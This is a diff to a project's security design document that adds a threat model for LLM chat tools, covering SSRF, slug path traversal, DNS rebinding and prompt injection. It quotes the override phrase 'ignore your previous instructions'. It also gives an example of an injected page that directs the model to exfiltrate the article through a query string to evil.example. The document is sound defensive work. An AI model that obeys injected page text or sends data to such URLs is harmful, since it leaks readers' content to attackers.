@@ -378,11 +378,19 @@ are a shared helper the wrong choice is visibly absent from, and a test that fai
   is tidiness, not safety — the read rule already refuses `/`, `\`, `.` and `..`, so anything it
   accepts is a single path segment. One definition **per question** (may this be minted? may this be
   read?) rather than one answer forced onto both. [`tests/slug.test.ts`](../../tests/slug.test.ts)
-  pins both halves, including that neither can reach `data/_jobs/`.
-  [`src/ingest.ts`](../../src/ingest.ts) says `^[a-z0-9][a-z0-9-]*$`;
-  [`src/comments.ts`](../../src/comments.ts) says `^[\w.-]+$`. Neither admits a `/`, so neither is a
+  pins both halves. [`src/ingest.ts`](../../src/ingest.ts) says `^[a-z0-9][a-z0-9-]*$`;
+  [`src/slug.ts`](../../src/slug.ts) says `^[\w.-]+$`. Neither admits a `/`, so neither is a
   traversal, but a codebase with two answers to "what is a slug" will eventually be asked the
   question by something that only checks one of them.
+
+  **`_jobs` is reserved by name**, and the reasoning that skipped it is worth keeping. The claim used
+  to be that `data/_jobs/` "cannot be reached through a slug" because `src/jobs.ts` builds its path
+  from a hardcoded constant — true, and the wrong direction. Nothing was going to arrive *from* the
+  queue; the risk was arriving *at* it, since `loadComments("_jobs")` joins `data/<slug>/comments.json`
+  and the queue reads every `.json` in its own directory as a job. The HTTP routes' stricter
+  `slugPart` refuses a leading underscore, so this was a false invariant rather than a live hole —
+  which is the kind most worth closing, because the next caller to reach a reader-state module by
+  another path inherits the assumption without the screening. Found by cross-model review, 2026-08-26.
 - **Nothing rate-limits or authenticates any of this**, which is fine for one process on a laptop and
   is not fine on the public internet — see
   [deploy-and-repo-move.md](../plans/deploy-and-repo-move.md), which has this going online.
@@ -431,6 +439,85 @@ than none, because it stops anyone looking again. Tested in
 **The rule to carry forward:** any model output that becomes an attribute — an `href`, a `src`, a
 `style`, an `id` — is untrusted input and needs an allowlist, not a parse. Model output that becomes
 a text node does not.
+
+## A fourth: what the model asks us to fetch <a id="chat-tools"></a>
+
+**Added 2026-08-26, with [chat tools](chat-tools.md).** The three above are all about text arriving
+and being rendered. This one is different in kind: the model now **chooses a URL and we fetch it**,
+and it chooses a slug and we look it up.
+
+Two exposures, and they are not the same shape.
+
+**Server-side request forgery.** `read_web_page` takes a URL the model picked — possibly from a
+search result, possibly from a page it just read, possibly from the article, none of which we
+control. "Persuaded to read `http://169.254.169.254/`" is a real request shape, not a hypothetical.
+The mitigation is that this tool does not fetch anything itself: it calls
+[`fetchDocument`](../../src/fetch.ts), which already carries the scheme allowlist, `isBlockedAddress`
+over the resolved addresses, the redirect limit, the size cap and the type sniff — because ingest
+needed all of it first. **Writing a bare `fetch` in the tool would have been three lines and an SSRF
+hole**, and it would have looked completely ordinary in review.
+
+**Path traversal, again.** `read_library_passage` takes a slug, and a slug is a path segment in the
+filesystem store — which is exactly how the confirmed traversal in
+[§ The URL is the second untrusted party](#the-url-is-the-second-untrusted-party) got in. It is
+checked with `isSlug` in [`src/chat-tools.ts`](../../src/chat-tools.ts) before it reaches the store,
+in addition to whatever the store does. The new fact is that **a model is now one of the things
+choosing that string**, so "only our own client sends this" was never true and is now not even
+nearly true.
+
+### Prompt injection, and what the fence does not do
+
+`read_web_page` puts a stranger's prose into a prompt that also holds the article and the reader's
+question. Pages containing "ignore your previous instructions" exist on purpose.
+
+What is done: the text is wrapped by `untrusted()` in a long, capitalised delimiter; any occurrence
+of that delimiter *inside* the content is broken up, so a page cannot close the fence and address the
+model after it; and the system prompt in [`src/converse.ts`](../../src/converse.ts) says what the
+fence means and what to do about anything inside it addressed to the model.
+
+**This is a mitigation and it is stated as one.** A determined injection can still steer an answer,
+and no amount of prompt text changes that.
+
+### A read tool can still send — the claim that was wrong here
+
+This section first said that "every one of these tools is a read", so nothing could be sent anywhere,
+and that the read-only property bounded the damage. **A GPT-5.6 review took that apart on 2026-08-26
+and it was right.** A GET is an outbound request, and its URL is a channel: a hostile page can tell
+the model that its next move is `read_web_page("https://evil.example/collect?q=…")` with the article
+or the reader's question in the query string. The fence is prompt text; prompt text is not a
+boundary. Reading is not neutral when the URL is the message.
+
+It is recorded rather than quietly edited because this is the second time this document has
+reassured a reader about something it had not checked — the first is three paragraphs up, and the
+lesson is the same one: **a security doc's confident sentence is exactly what stops the next person
+looking.**
+
+What is done: `read_web_page` refuses a URL whose query and fragment exceed 256 characters, or whose
+whole length exceeds 2,048 (`MAX_URL_QUERY_CHARS` in [`src/chat-tools.ts`](../../src/chat-tools.ts)),
+and tells the model to report the attempt to the reader. That caps the payload well below a
+paragraph. **It stops bulk exfiltration and not a determined trickle** — four rounds at 256 characters
+is a kilobyte. The fix that actually closes it is an allowlist of URLs already in play (links in the
+article, URLs the reader typed, citations from this turn's web search) and it is in
+[chat-tools.md § Still open](chat-tools.md#still-open).
+
+### The address guard does not survive DNS rebinding
+
+Also from that review, and also worth stating plainly: `guardAddress` resolves the hostname, checks
+the addresses against `isBlockedAddress`, and then `fetch` **resolves it again**. A hostname the
+attacker controls can answer publicly for the check and `127.0.0.1` or `169.254.169.254` for the
+connection. This is not new and was not introduced here — but this feature is what makes it matter,
+because the hostname used to come from the reader and now comes from a model that a page can argue
+with. The real fix is connecting to the address that was checked instead of re-resolving, which is
+`src/fetch.ts`'s to make.
+
+### What does still hold
+
+Nothing chat can call writes a file, deletes anything, or spends the reader's money. That property is
+load-bearing and it is the reason the write tools in
+[chat-tools.md § Not built](chat-tools.md#not-built-and-worth-building) are not built yet. The first
+one that writes turns "an injected page made the answer wrong" into "an injected page changed the
+reader's data", which is a different problem needing a different answer — most likely the reader
+confirming the action rather than the model being trusted not to be fooled.
 
 ## Known gaps
 
